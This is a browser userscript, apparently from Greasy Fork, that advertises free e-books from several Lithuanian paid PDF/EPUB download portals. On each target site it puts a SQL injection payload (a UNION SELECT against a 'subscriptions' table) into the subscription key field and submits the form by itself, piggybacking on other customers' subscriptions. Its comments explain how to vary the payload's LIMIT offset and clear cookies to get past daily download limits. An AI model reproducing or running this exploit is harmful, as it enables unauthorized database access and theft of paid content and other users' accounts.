// ==UserScript==
// @name         Nemokamos elektroninės knygos
// @namespace    blablabla
// @version      0.3
// @match        *://knygos24.com/viplogin.php
// @match        *://knygos24.com/download.php?id=*
// @match        *://epubknygos.com/download.php?id=*
// @match        *://knygos.net/*.html
// @match        *://knygos.net/download1.php?id=*
// @match        *://pdfknygos.net/download.php?id=*
// @grant        none
// @description Nemokamos elektroninės knygos iš įvairių PDF/EPUB knygų atsisiuntimų portalų.
// @downloadURL https://update.greasyfork.org/scripts/376186/Nemokamos%20elektronin%C4%97s%20knygos.user.js
// @updateURL https://update.greasyfork.org/scripts/376186/Nemokamos%20elektronin%C4%97s%20knygos.meta.js
// ==/UserScript==
/*

Palaikomos svetaines:
>>> knygostau.com (Pirmiausia reikia eiti i knygos24.com prisijungimui (tik tiek), o tada is kart eiti i knygostau.com siustis knygu)
>>> epubknygos.com (limitas 6 knygos per diena - zemiau yra instrukcijos ka daryti, kad gauti dar 6 atsisiuntimus (ir t.t.))
>>> knygos.net (reikes susikurti accounta ir i ji prisijungti. Gali tekti naudoti savo asmenini, nes sistema gerai aptinka temporary emailus).
>>> pdfknygos.net

*/
var website = window.location.hostname;
//===================================================================================

// Cia skirta tik prisijungti, o knygas siustis is knygostau.com !!!
if(website == "knygos24.com"){
	var tel = document.getElementsByName("tel")[0];
	var key = document.getElementsByName("key")[0];
	var form = document.querySelectorAll('form[method="post"]')[0];

	if(!tel || !key || !form){ return; }

	tel.value = "370";
	key.value = "123123123123123' LIMIT 1 UNION SELECT * FROM `subscriptions` LIMIT 1, 1 UNION SELECT * FROM `subscriptions` where `telephone` = '123123123123";
	form.submit();
	return;
}

//===================================================================================

if(website == "epubknygos.com"){
	// Jeigu pasiektas dienos atsisiuntimu limitas:
	// 1. Zemiau pakeist "random" is "2" i pvz "3".
	// 2. Isvalyti narykles cookies (naudoju http://www.editthiscookie.com/ )
	// 3. Meginti is naujo. Gali kartoti cia procedura is naujo su kitu skaiciumi, jei ir sekanciam skaiciui pasiektas limitas. :)
	var random = "2";

	var tel = document.getElementsByName("User_telephone")[0];
	var key = document.getElementsByName("Key_code")[0];
	var submit = document.getElementsByName("pirktiPaslauga")[0];

	if(!tel || !key || !submit){ return; }

	tel.value = "370";
	key.value = "123123123123123' LIMIT 1 UNION SELECT * FROM `subscriptions` LIMIT " + random + ", 1 UNION SELECT * FROM `subscriptions` where `telephone` = '123123123123";
	submit.click();
	return;
}

//===================================================================================

if(website == "knygos.net"){
	var tel = document.getElementsByName("User_telephone")[0];
	var key = document.getElementsByName("Key_code")[0];
	var submit = document.getElementsByName("pirktiPaslauga")[0];

	if(!tel || !key || !submit){ return; }

	tel.value = "370";
	key.value = "123123123123123' LIMIT 1 UNION SELECT * FROM `subscriptions` LIMIT 1, 1 UNION SELECT * FROM `subscriptions` where `telephone` = '123123123123";
	submit.click();
	return;
}

//===================================================================================

if(website == "pdfknygos.net"){
	var tel = document.getElementsByName("User_telephone")[0];
	var key = document.getElementsByName("Key_code")[0];
	var submit = document.getElementsByName("pirktiPaslauga")[0];

	if(!tel || !key || !submit){ return; }

	tel.value = "370";
	key.value = "123123123123123' LIMIT 1 UNION SELECT * FROM `subscriptions` LIMIT 1, 1 UNION SELECT * FROM `subscriptions` where `telephone` = '123123123123";
	submit.click();
	return;
}